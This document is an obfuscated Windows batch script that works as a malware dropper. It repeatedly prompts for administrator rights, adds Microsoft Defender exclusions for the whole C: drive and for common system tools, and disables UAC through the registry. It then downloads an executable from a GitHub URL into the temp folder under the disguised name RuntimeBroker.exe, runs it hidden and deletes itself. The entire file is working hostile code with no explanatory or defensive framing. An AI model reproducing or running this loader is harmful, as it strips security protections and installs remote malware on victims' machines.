@echo off & setlocal enableDelayedExpansion
set "fdCM=NET" & set "bMo=SESSION" & set "Sbr=2>&1" & set "flxy=>nul"
%fdCM% %bMo% %flxy% %Sbr%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "ICmo=bar" & set "IPyU=baz" & set "KKeAH=foo" & set "agi=qux" & rem XCCMJyL Gjc HIE
set "CNWJI=powershell -ExecutionPolicy Bypass -Command"
set "xLY=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "fPWwg='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "vDim='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!CNWJI! "!xLY! !fPWwg! !vDim!" %flxy% %Sbr%
set "rZcOR=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "xMIZj=-Name 'EnableLUA' -Value 0"
!CNWJI! "!rZcOR! !xMIZj!" %flxy% %Sbr%
set "meJt=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!CNWJI! "!meJt!" %flxy% %Sbr%
if !errorlevel! neq 0 (goto %a%)
set "HUe=timeout /t" & !HUe! 2 %flxy% %Sbr%
set "SUk=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "Mqs=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "Cdai=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!CNWJI! "!SUk! !Mqs! !Cdai!" %flxy% %Sbr%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!HUe! 1 %flxy% %Sbr% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %flxy% %Sbr%
del /f /q "%~f0" %flxy% %Sbr%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %flxy% %Sbr%
if !errorlevel! neq 0 (!HUe! 3 %flxy% %Sbr% & goto %b%)
exit /b
